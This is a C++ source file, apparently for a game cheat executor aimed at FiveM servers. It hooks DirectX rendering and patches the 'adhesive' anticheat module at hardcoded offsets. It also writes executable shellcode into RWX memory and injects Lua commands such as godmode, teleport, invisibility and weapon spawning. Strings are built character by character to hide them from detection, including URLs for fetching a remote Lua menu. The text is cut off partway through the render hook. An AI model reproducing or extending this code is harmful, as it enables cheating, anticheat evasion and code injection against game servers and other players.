#pragma once
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include "includes.h"
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <cstdint>
#include <functional>
#include <thread>
#include <d3d9.h>
#include "main.h"
#include <iostream>
#include <fstream>
#include <direct.h>
#include <random>
#include <regex>
#include <sstream>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <cstdint>
#include <functional>
#include <cstdio>
#include "CustomAPI.h"
#include <experimental/filesystem>
#include <sstream>
#include "auth.h"

//GUI
#include "imgui/imgui.h"
#include "imgui/TextEditor.h"
#include "imgui/ImGuiFileDialog.h"

// Dependencies for URLDownloadToFileA
#include <tchar.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "urlmon.lib")

#include <WinINet.h>

#pragma once
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <random>
#include <regex>
#include <sstream>
#include "settings.h"
#define GetCurrentDir _getcwd

using namespace std;
namespace fs = std::experimental::filesystem;


extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
void CreateFileAndExecute(string code, string path_to_gen);

Present oPresent;
HWND window = NULL;
WNDPROC oWndProc;
ID3D11Device* pDevice = NULL;
ID3D11DeviceContext* pContext = NULL;
ID3D11RenderTargetView* mainRenderTargetView;

void InitImGui()
{
	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	io.ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;
	ImGui_ImplWin32_Init(window);
	ImGui_ImplDX11_Init(pDevice, pContext);
}

void DrawRect(IDirect3DDevice9* dev, int x, int y, int w, int h, D3DCOLOR color)
{
	D3DRECT BarRect = { x, y, x + w, y + h };
	dev->Clear(1, &BarRect, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, color, 0, 0);
}


LRESULT __stdcall WndProc(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {

	if (true && ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam))
		return true;

	return CallWindowProc(oWndProc, hWnd, uMsg, wParam, lParam);
}

uint64_t AdhesiveOffset = 0x4928DC;
uint64_t LoadSystemFileInternalOffset = 0x289A8;
uint64_t LoadSystemFileOffset = 0x28A90;
uint64_t LuaRuntimeOffset = 0x63CF80;

uint64_t cryptbase1 = 12345678909876, cryptbase2 = 234567890987654;

uint64_t ReturnEncrypted(string a) {
	uint64_t encryptedAdhesive = (AdhesiveOffset + cryptbase1) ^ cryptbase2;
	uint64_t encryptedLSFIO = (LoadSystemFileInternalOffset + cryptbase1) ^ cryptbase2;
	uint64_t encryptedLSFO = (LoadSystemFileOffset + cryptbase1) ^ cryptbase2;
	uint64_t encryptedLRO = (LuaRuntimeOffset + cryptbase1) ^ cryptbase2;
	if (a == "a") {
		return encryptedAdhesive;
	}
	else if (a == "ls") {
		return encryptedLSFIO;
	}
	else if (a == "l") {
		return encryptedLSFO;
	}
	else if (a == "lr") {
		return encryptedLRO;
	}
}

uint64_t decryptedAdhesive() {
	uint64_t offset = (ReturnEncrypted("a") ^ cryptbase2) - cryptbase1;
	return offset;
}uint64_t decryptedLSFIO() {
	uint64_t offset = (ReturnEncrypted("ls") ^ cryptbase2) - cryptbase1;
	return offset;
}uint64_t decryptedLSFO() {
	uint64_t offset = (ReturnEncrypted("l") ^ cryptbase2) - cryptbase1;
	return offset;
}uint64_t decryptedLRO() {
	uint64_t offset = (ReturnEncrypted("lr") ^ cryptbase2) - cryptbase1;
	return offset;
}


bool label_1;
bool label_2;
bool label_3;
bool label_4;
bool label_5;
bool label_6;
bool label_7;
bool label_11;
int label_12 = 90;
float label_13[] = { 255.0f, 0.0f, 0.0f, };
float label_14[] = { 0.0f, 255.0f, 0.0f, };
float label_15 = 1.0f;
static bool _aimbot = false;
static bool _godmode = false;
static bool _semigodmode = false;
static bool _superjump = false;
static bool _invisible = false;
static bool _teleport = false;
static bool _cross_hair = false;
string path_to_event_viewer = "";


char zero = static_cast<char>(48);
char one = static_cast<char>(49);
char two = static_cast<char>(50);
char three = static_cast<char>(51);
char four = static_cast<char>(52);
char five = static_cast<char>(53);
char six = static_cast<char>(54);
char seven = static_cast<char>(55);
char eight = static_cast<char>(56);
char nine = static_cast<char>(57);
char percent = static_cast<char>(37);
char A = static_cast<char>(65);
char B = static_cast<char>(66);
char C = static_cast<char>(67);
char D = static_cast<char>(68);
char E = static_cast<char>(69);
char F = static_cast<char>(70);
char G = static_cast<char>(71);
char H = static_cast<char>(72);
char I = static_cast<char>(73);
char J = static_cast<char>(74);
char K = static_cast<char>(75);
char L = static_cast<char>(76);
char M = static_cast<char>(77);
char N = static_cast<char>(78);
char O = static_cast<char>(79);
char P = static_cast<char>(80);
char Q = static_cast<char>(81);
char R = static_cast<char>(82);
char S = static_cast<char>(83);
char T = static_cast<char>(84);
char U = static_cast<char>(85);
char V = static_cast<char>(86);
char W = static_cast<char>(87);
char X = static_cast<char>(88);
char Y = static_cast<char>(89);
char Z = static_cast<char>(90);
char a = static_cast<char>(97);
char b = static_cast<char>(98);
char c = static_cast<char>(99);
char d = static_cast<char>(100);
char e = static_cast<char>(101);
char f = static_cast<char>(102);
char g = static_cast<char>(103);
char h = static_cast<char>(104);
char i = static_cast<char>(105);
char j = static_cast<char>(106);
char k = static_cast<char>(107);
char l = static_cast<char>(108);
char m = static_cast<char>(109);
char n = static_cast<char>(110);
char o = static_cast<char>(111);
char p = static_cast<char>(112);
char q = static_cast<char>(113);
char r = static_cast<char>(114);
char s = static_cast<char>(115);
char t = static_cast<char>(116);
char u = static_cast<char>(117);
char v = static_cast<char>(118);
char w = static_cast<char>(119);
char x = static_cast<char>(120);
char y = static_cast<char>(121);
char z = static_cast<char>(122);
char space = static_cast<char>(32);
string zerox(1, zero);
string onex(1, one);
string twox(1, two);
string threex(1, three);
string fourx(1, four);
string fivex(1, five);
string sixx(1, six);
string sevenx(1, seven);
string eightx(1, eight);
string ninex(1, nine);
string percentx(1, percent);
string Ax(1, A);
string Bx(1, B);
string Cx(1, C);
string Dx(1, D);
string Ex(1, E);
string Fx(1, F);
string Gx(1, G);
string Hx(1, H);
string Ix(1, I);
string Jx(1, J);
string Kx(1, K);
string Lx(1, L);
string Mx(1, M);
string Nx(1, N);
string Ox(1, O);
string Px(1, P);
string Qx(1, Q);
string Rx(1, R);
string Sx(1, S);
string Tx(1, T);
string Ux(1, U);
string Vx(1, V);
string Wx(1, W);
string Xx(1, X);
string Yx(1, Y);
string Zx(1, Z);
string ax(1, a);
string bx(1, b);
string cx(1, c);
string dx(1, d);
string ex(1, e);
string fx(1, f);
string gx(1, g);
string hx(1, h);
string ix(1, i);
string jx(1, j);
string kx(1, k);
string lx(1, l);
string mx(1, m);
string nx(1, n);
string ox(1, o);
string px(1, p);
string qx(1, q);
string rx(1, r);
string sx(1, s);
string tx(1, t);
string ux(1, u);
string vx(1, v);
string wx(1, w);
string xx(1, x);
string yx(1, y);
string zx(1, z);
string spacex(1, 32);
char slash = static_cast<char>(47);
char backslash = static_cast<char>(92);
string slashx(1, slash);
string backslashx(1, backslash);
char dwukrop = static_cast<char>(58);
char dot = static_cast<char>(46);
char przecinek = static_cast<char>(44);
string dwukropx(1, dwukrop);
string dotx(1, dot);
string przecinekx(1, przecinek);
char cudzyslow = static_cast<char>(34);
char hashtag = static_cast<char>(35);
string cudzyslowx(1, cudzyslow);
string hashtagx(1, hashtag);
char wykrzynik = static_cast<char>(33);
string wykrzynikx(1, wykrzynik);
char zamknietynawias = static_cast<char>(41);
char otwartynawias = static_cast<char>(40);
char minuss = static_cast<char>(45);
char podloga = static_cast<char>(95);
string zamknietynawiasx(1, zamknietynawias);
string minusx(1, minuss);
string otwartynawiasx(1, otwartynawias);
string podlogax(1, podloga);


string GetLuaBase() {
	string one = cx + ix + tx + ix + zx + ex + nx + minusx + sx + cx + rx + ix + px + tx + ix + nx + gx + minusx + lx + ux + ax;
	return one;
}

string GetAdhesive() {
	string one = ax + dx + hx + ex + sx + ix + vx + ex;
	return one;
}

string GetExecName() {
	string one = spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + Fx + Ax + Lx + Lx + spacex + Ex + Xx + Ex + Cx + Ux + Tx + Ox + Rx + dotx;
	return one;
}

string GetFrosherowski() {
	string one = spacex + spacex + spacex + spacex + Fx + rx + ox + sx + hx + ex + rx + ox + wx + sx + kx + ix + hashtagx + threex + sixx + zerox + zerox + spacex;
	return one;
}

string GetBaggy() {
	string one = spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + bx + ax + gx + gx + yx + hashtagx + sixx + eightx + sevenx + fivex;
	return one;
}

string GetMenuExecName() {
	string one = spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + Wx + ex + lx + cx + ox + mx + ex + spacex + ix + nx + spacex + Fx + Ax + Lx + Lx + spacex + Ex + Xx + Ex + Cx + Ux + Tx + Ox + Rx + spacex;
	return one;
}
string GetUnderExecName() {
	string one = spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + spacex + Fx + ux + cx + kx + spacex + Cx + rx + ax + cx + kx + ex + rx + sx + wykrzynikx + spacex + dwukropx + zamknietynawiasx;
	return one;
}
string GetTriggerWithApo() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + otwartynawiasx + backslashx + cudzyslowx;
	return one;
}
string GetSelfMenuAfterTrigger() {
	string one = backslashx + cudzyslowx + przecinekx + spacex + backslashx + cudzyslowx; // \", \"\", "
	return one;
}
string GetSelfMenuAfterArg() {
	string one = backslashx + cudzyslowx + przecinekx + spacex + cudzyslowx;
	return one;
}
string MultiChooseTrigger() {
	string one = fx + ax + lx + lx + podlogax + fx + sx + ninex + ax + fx + ix + Sx + Ax + sevenx + eightx + fx + dx + eightx + yx + sx + hx + fx + Ux + Dx + Ix + Sx + Hx + Fx + jx + kx;
	return one;
}
string MultiChooseTriggerWaypointRepair() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + otwartynawiasx + backslashx + cudzyslowx + fx + ax + lx + lx + podlogax + gx + dx + dx + Mx + Dx + Gx + jx + ux + ix + fx + gx + fx + dx + backslashx + cudzyslowx + przecinekx;
	return one;
}

string GiveWeaponTrigger() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + otwartynawiasx + backslashx + cudzyslowx + fx + ax + lx + lx + podlogax + hx + dx + ux + ix + sx + hx + gx + ux + ix + Dx + Sx + Gx + Ux + backslashx + cudzyslowx + przecinekx + x + backslashx + cudzyslowx;
	return one;
}
string SpawnVehicleTrigger() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + otwartynawiasx + backslashx + cudzyslowx + fx + ax + lx + lx + podlogax + gx + jx + dx + ux + sx + gx + hx + Bx + Dx + Ux + Jx + Sx + Gx + Kx + dx + dx + sx + dx + fx + Ex + backslashx + cudzyslowx + przecinekx + x + backslashx + cudzyslowx;
	return one;
}
string LuaFileName() {
	string one = backslashx + backslashx + dx + ox + nx + tx + tx + ex + lx + lx + ax + nx + yx + ox + nx + ex + dotx + lx + ux + ax;
	return one;
}

string GetFullTrigger() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + spacex + otwartynawiasx + cudzyslowx + fx + ax + lx + lx + podlogax + fx + sx + ninex + ax + fx + ix + Sx + Ax + sevenx + eightx + fx + dx + eightx + yx + sx + hx + fx + Ux + Dx + Ix + Sx + Hx + Fx + jx + kx + cudzyslowx + przecinekx + spacex;
	return one;
}
string GetSpawnVehTrigger() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + otwartynawiasx + cudzyslowx + fx + ax + lx + lx + podlogax + gx + jx + dx + ux + sx + gx + hx + Bx + Dx + Ux + Jx + Sx + Gx + Kx + dx + dx + sx + dx + fx + Ex + cudzyslowx + przecinekx + spacex;
	return one;
}
string GetGiveWeaponTrigger() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + otwartynawiasx + cudzyslowx + fx + ax + lx + lx + podlogax + hx + dx + ux + ix + sx + hx + gx + ux + ix + Dx + Sx + Gx + Ux + cudzyslowx + przecinekx + spacex;
	return one;
}
string GetWaypointTrigger() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + otwartynawiasx + cudzyslowx + fx + ax + lx + lx + podlogax + gx + ox + Hx + Nx + Ux + Gx + Jx + hx + bx + ix + Jx + Dx + Sx + Gx + Bx + dx + sx + cudzyslowx + zamknietynawiasx;
	return one;
}
string GetRepairVehTrigger() {
	string one = Tx + rx + ix + gx + gx + ex + rx + Ex + vx + ex + nx + tx + otwartynawiasx + cudzyslowx + fx + ax + lx + lx + podlogax + gx + ox + Hx + Nx + Ux + Gx + Jx + hx + fx + gx + Jx + Kx + Hx + Gx + Ux + Ix + fx + fx + dx + sx + cudzyslowx + zamknietynawiasx;
	return one;
}

string GetLuaMenuLink() {
	string one = hx + tx + tx + px + dwukropx + slashx + slashx + fivex + onex + dotx + sevenx + sevenx + dotx + fivex + zerox + dotx + fivex + zerox + slashx + ex + sx + slashx + mx + ex + nx + ux + sx + slashx + mx + ex + nx + ux + dotx + lx + ux + ax;

	return one;
}

string GetNewLuaMenuLink() {
	string tow = hx + tx + tx + px + dwukropx + slashx + slashx + dx + ex + vx + dotx + mx + ax + sx + tx + ex + rx + lx + ux + ax + dotx + cx + ox + mx + dwukropx + eightx + zerox + eightx + onex + slashx + ex + sx + slashx + mx + ex + nx + ux + sx + slashx + mx + ex + nx + ux + dotx + lx + ux + ax;
	return tow;
}

inline const char* const BoolToString(bool b)
{
	return b ? "true" : "false";
}

bool InvisLast;
void Invisible(bool co) {
	if (InvisLast != co) {
		InvisLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"notinvis\", ";
		cmdtoexec += BoolToString(!co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}

}

bool GodLast;
void GodMode(bool co) {
	if (GodLast != co) {
		GodLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"notgod\", ";
		cmdtoexec += BoolToString(co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}
}

bool SuperJumpLast;
void SuperJump(bool co) {
	if (SuperJumpLast != co) {
		SuperJumpLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"superjumpik\", ";
		cmdtoexec += BoolToString(co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}

}
bool SemiGodModeLast;
void SemiGodMode(bool co) {
	if (SemiGodModeLast != co) {
		SemiGodModeLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"semigodzik\", ";
		cmdtoexec += BoolToString(co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}

}
bool DrawCrosshairLast;
void DrawCrosshair(bool co) {
	if (DrawCrosshairLast != co) {
		DrawCrosshairLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"crosshairik\", ";
		cmdtoexec += BoolToString(co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}

}
bool ExplosiveAmmoLast;
void ExplosiveAmmo(bool co) {
	if (ExplosiveAmmoLast != co) {
		ExplosiveAmmoLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"explosiveammo\", ";
		cmdtoexec += BoolToString(co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}

}
bool InfiniteAmmoLast;
void InfiniteAmmo(bool co) {
	if (InfiniteAmmoLast != co) {
		InfiniteAmmoLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"infiniteammo\", ";
		cmdtoexec += BoolToString(co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}

}
bool NoReloadLast;
void NoReload(bool co) {
	if (NoReloadLast != co) {
		NoReloadLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"noreload\", ";
		cmdtoexec += BoolToString(co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}

}
bool VehicleGodModeLast;
void VehicleGodMode(bool co) {
	if (VehicleGodModeLast != co) {
		VehicleGodModeLast = co;
		CHAR NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);

		string path_to_exec = NPath;
		path_to_exec += LuaFileName();
		string cmdtoexec = GetFullTrigger();
		cmdtoexec += "\"vehgod\", ";
		cmdtoexec += BoolToString(co);
		cmdtoexec += ")";
		CreateFileAndExecute(cmdtoexec, path_to_exec);
	}

}

void TeleportToWaypoint() {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"tptowaypoint\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}

void GiveWeapon(string co) {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"giveweapon\", \"";
	cmdtoexec += co;
	cmdtoexec += "\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}

void RepairVehicle() {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"repairmyveh\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}
void SpawnVehicle(string co) {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"spawnveh\", \"";
	cmdtoexec += co;
	cmdtoexec += "\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}
void ReviveMe() {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"reviveme\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}
void HealMe() {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"healme\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}
void GiveArmorMe() {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"armorme\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}
void PerformanceTuning() {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"performancetuning\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}

void ChangePlate(string co) {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"changeplate\", \"";
	cmdtoexec += co;
	cmdtoexec += "\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}
void TpToPlayer(string co) {
	CHAR NPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, NPath);

	string path_to_exec = NPath;
	path_to_exec += LuaFileName();
	string cmdtoexec = GetFullTrigger();
	cmdtoexec += "\"tptoplayer\", \"";
	cmdtoexec += co;
	cmdtoexec += "\")";
	CreateFileAndExecute(cmdtoexec, path_to_exec);
}


void grabfiles(string pathino) {


	struct stat s;
	std::string path = pathino;
	for (const auto& entry : fs::directory_iterator(path)) {

		string pathino = entry.path().u8string();

		if (stat(pathino.c_str(), &s) == 0)
		{
			if (s.st_mode & S_IFDIR)
			{
				grabfiles(pathino.c_str());
			}
			else if (s.st_mode & S_IFREG)
			{
				std::string str;
				std::ifstream file(pathino.c_str());
				std::string file_contents;
				while (std::getline(file, str))
				{
					if (str.find("TriggerEvent") != std::string::npos || str.find("TriggerServerEvent") != std::string::npos) {
						Sleep(100);
						std::regex r("\\s+");
						str = std::regex_replace(str, r, "");
						ImGui::Text(str.c_str());
						ImGui::SameLine();
						if (ImGui::Button("Copy", ImVec2(65, 20))) {

						}

					}
				}
			}
			else
			{
			}
		}
		else
		{
			//error
		}

	}
}

static inline std::string replace_all(std::string subject, const std::string& search, const std::string& replace)
{
	size_t pos = 0;
	while (std::string::npos != (pos = subject.find(search, pos)))
	{
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}



static inline std::basic_string<char> download_url(const std::string& url)
{
	const auto interwebs = InternetOpenA("Mozilla/5.0", 1, nullptr, nullptr, 0);
	std::basic_string<char> rtn;
	if (interwebs)
	{
		const auto url_file = InternetOpenUrlA(interwebs, url.c_str(), nullptr, 0, 0, 0);
		if (url_file)
		{
			char buffer[2000];
			unsigned long bytes_read;
			do
			{
				InternetReadFile(url_file, buffer, 2000, &bytes_read);
				rtn.append(buffer, bytes_read);
				memset(buffer, 0, 2000);
			} while (bytes_read);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(url_file);
			auto p = replace_all(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	auto p = replace_all(rtn, "|n", "\r\n");
	return p;
}


static int tabs = 1;
bool init = false;
bool menu_show = false;
bool fastmenu_injected = false;

using RunFileInternal_t = int(*)(uint64_t, const char*, std::function<int(char*)>);
using LoadSystemFileInternal_t = int(*)(uint64_t, const char*);
char LSFIShell[] = { 0x55, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x38, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69 };

uint64_t csLuaBase;
uint64_t grabbedInstance;
uint64_t allocLSFI;


int _fastcall LoadSystemFileInternal(uint64_t luaRuntime, const char* scriptFile) {
	if (!allocLSFI) {
		allocLSFI = reinterpret_cast<uint64_t>(VirtualAlloc(NULL, sizeof(LSFIShell), MEM_COMMIT, 0x40));
		memcpy((void*)allocLSFI, (void*)LSFIShell, sizeof(LSFIShell));
		*(uint64_t*)(allocLSFI + 14) = csLuaBase + 0x289A8;
	}

	return ((LoadSystemFileInternal_t)(allocLSFI))(luaRuntime, scriptFile);
}

int LoadSystemFile(uint64_t luaRuntime, const char* scriptFile) {
	*(BYTE*)(CustomAPI::GetModuleA("adhesive") + 0x49288C) = 1;
	auto result = ((RunFileInternal_t)(csLuaBase + 0x28A90))(luaRuntime, scriptFile, std::bind(&LoadSystemFileInternal, luaRuntime, std::placeholders::_1));
	return result;
}




void CreateFileAndExecute(string code, string path_to_gen) {

	std::ofstream scripttoexec;
	scripttoexec.open(path_to_gen.c_str());
	scripttoexec << code;
	scripttoexec.close();
	LoadSystemFile(grabbedInstance, path_to_gen.c_str());
	remove(path_to_gen.c_str());
	//RequestDel(path);
}


namespace {
	std::string const default_chars =
		"abcdefghijklmnaoqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
}

std::string random_string(size_t len = 15, std::string const& allowed_chars = default_chars) {
	std::mt19937_64 gen{ std::random_device()() };

	std::uniform_int_distribution<size_t> dist{ 0, allowed_chars.length() - 1 };

	std::string ret;

	std::generate_n(std::back_inserter(ret), len, [&] { return allowed_chars[dist(gen)]; });
	return ret;
}


HRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)
{
	if (!init)
	{
		if (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&pDevice)))
		{
			pDevice->GetImmediateContext(&pContext);
			DXGI_SWAP_CHAIN_DESC sd;
			pSwapChain->GetDesc(&sd);
			window = sd.OutputWindow;
			ID3D11Texture2D* pBackBuffer;
			pSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);
			pDevice->CreateRenderTargetView(pBackBuffer, NULL, &mainRenderTargetView);
			pBackBuffer->Release();
			oWndProc = (WNDPROC)SetWindowLongPtr(window, GWLP_WNDPROC, (LONG_PTR)WndProc);
			InitImGui();
			init = true;
		}

		else
			return oPresent(pSwapChain, SyncInterval, Flags);
	}

	char cCurrentPath[FILENAME_MAX];

	if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath)))
	{
		return errno;
	}

//	cCurrentPath[sizeof(cCurrentPath) - 1] = '\0'; // Make problem when inject fastmenu // So dont need


	if (GetAsyncKeyState(VK_RMENU) & 1) {
		menu_show = !menu_show;
		ImGuiIO& io = ImGui::GetIO(); (void)io;
		if (menu_show) {
			io.MouseDrawCursor = true;
		}
		else if (!menu_show) {
			keybd_event(VK_F8, 0, 0, 0); // Press F8 Debug for fucking Lokimodz
			io.MouseDrawCursor = false;
		}
	}


	if (menu_show) {
		ImGuiStyle* style = &ImGui::GetStyle();

		style->WindowPadding = ImVec2(15, 15);
		style->WindowRounding = 5.0f;
		style->FramePadding = ImVec2(5, 5);
		style->FrameRounding = 4.0f;
		style->ItemSpacing = ImVec2(12, 8);
		style->ItemInnerSpacing = ImVec2(8, 6);
		style->IndentSpacing = 25.0f;
		style->ScrollbarSize = 15.0f;
		style->ScrollbarRounding = 9.0f;
		style->GrabMinSize = 5.0f;
		style->GrabRounding = 3.0f;

		style->Colors[ImGuiCol_Text] = ImVec4(0.80f, 0.80f, 0.83f, 1.00f);
		style->Colors[ImGuiCol_TextDisabled] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		style->Colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		style->Colors[ImGuiCol_PopupBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		style->Colors[ImGuiCol_Border] = ImVec4(0.80f, 0.80f, 0.83f, 0.88f);
		style->Colors[ImGuiCol_BorderShadow] = ImVec4(0.92f, 0.91f, 0.88f, 0.00f);
		style->Colors[ImGuiCol_FrameBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		style->Colors[ImGuiCol_FrameBgActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		style->Colors[ImGuiCol_TitleBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_TitleBgCollapsed] = ImVec4(1.00f, 0.98f, 0.95f, 0.75f);
		style->Colors[ImGuiCol_TitleBgActive] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		style->Colors[ImGuiCol_MenuBarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_ScrollbarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		style->Colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		style->Colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
